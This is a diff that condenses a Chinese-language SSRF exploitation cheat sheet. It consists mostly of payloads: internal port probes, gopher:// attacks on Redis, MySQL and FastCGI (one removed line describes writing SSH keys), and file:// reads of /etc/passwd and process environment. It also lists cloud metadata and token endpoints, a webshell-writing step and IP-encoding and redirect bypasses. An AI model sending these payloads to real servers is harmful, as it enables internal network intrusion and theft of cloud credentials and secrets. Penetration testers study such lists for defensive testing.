@@ -1,100 +1,45 @@
 # SSRF 利用思路
 
-> Server-Side Request Forgery — 服务端请求伪造
-
----
-
-## 利用场景
-
-### 1. 内网服务探测
+## 内网服务探测
 ```
-利用 SSRF 探测内网开放端口：
 file_get_contents("http://127.0.0.1:8080/admin")
 file_get_contents("http://192.168.1.1:22")
-file_get_contents("http://10.0.0.1:6379")  # Redis
+file_get_contents("http://10.0.0.1:6379")
 ```
 
-### 2. 攻击内网服务
+## 攻击内网服务
 ```
-Redis未授权访问:
-  gopher://127.0.0.1:6379/_*2%0d%0a$3%0d%0aget%0d%0a...（gopher协议写入SSH密钥）
-
-MySQL:
-  gopher://127.0.0.1:3306/_
-
-Elasticsearch:
-  http://127.0.0.1:9200/_cat
-
-Memcached:
-  gopher://127.0.0.1:11211/_...
-
-FastCGI:
-  gopher://127.0.0.1:9000/_...
+Redis:    gopher://127.0.0.1:6379/_
+MySQL:    gopher://127.0.0.1:3306/_
+FastCGI:  gopher://127.0.0.1:9000/_
+ES:       http://127.0.0.1:9200/_cat
 ```
 
-### 3. 读取本地文件
+## 读取本地文件
 ```
-file:///etc/passwd
-file:///proc/self/environ
-file:///proc/self/cmdline
-file:///proc/self/fd/*
+file:///etc/passwd  file:///proc/self/environ
 file:///var/www/html/index.php
 ```
 
-### 4. 云原数据节点
+## 云原数据节点
 ```
-AWS:
-  http://169.254.169.254/latest/meta-data/
-  http://169.254.169.254/latest/user-data/
-
-GCP:
-  http://metadata.google.internal/computeMetadata/v1/
-  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
-
-阿里云:
-  http://100.100.100.200/latest/meta-data/
+AWS:    http://169.254.169.254/latest/meta-data/
+GCP:    http://metadata.google.internal/computeMetadata/v1/
+阿里云: http://100.100.100.200/latest/meta-data/
 ```
 
-### 5. 写入 Webshell（结合 SSRF + 文件操作）
+## 写入 Webshell
+SSRF + 可写文件：找目标 URL 下能回显用户输入的页面，写入木马
+
+## 绕过方式
 ```
-场景: 审计中发现可以将URL内容写入文件
-如果只允许固定URL，可以找该URL下能够回显或输出用户输入的页面
-依赖这个页面内容实现写入
-```
-
----
-
-## 常用 Payload 写法
-
-```php
-# 常规
-http://127.0.0.1:80
-http://127.0.0.1:8080/admin
-
-# 十进制IP
-http://2130706433/                  # 127.0.0.1
-
-# 八进制IP
-http://0177.0.0.1/                  # 127.0.0.1
-
-# 十六进制IP
-http://0x7f000001/                  # 127.0.0.1
-
-# URL 编码绕过
-http://127.0.0.1%2fadmin
-http://127.0.0.1%23admin
-
-# 短网址绕过
-http://dwz.cn/xxxx                   # 指向内网地址
-
-# DNS 重绑定（配合自定义域名）
-http://xx.example.com                # 解析瞬间切换到内网IP，TTL=0
-
-# 302 跳转绕过
-# 先请求一个可控制的站，该站302跳转到内网
-
-# 协议组合
-gopher://127.0.0.1:6379/_...
-dict://127.0.0.1:6379/info
-file:///etc/passwd
+常规IP:     http://127.0.0.1
+十进制:     http://2130706433
+八进制:     http://0177.0.0.1
+十六进制:   http://0x7f000001
+IPv6:       http://[::1]
+简写:       http://127.1
+DNS重绑定:  TTL=0 域名
+302跳转:    攻击者服务器跳转到内网
+gopher://   dict://   file://
 ```
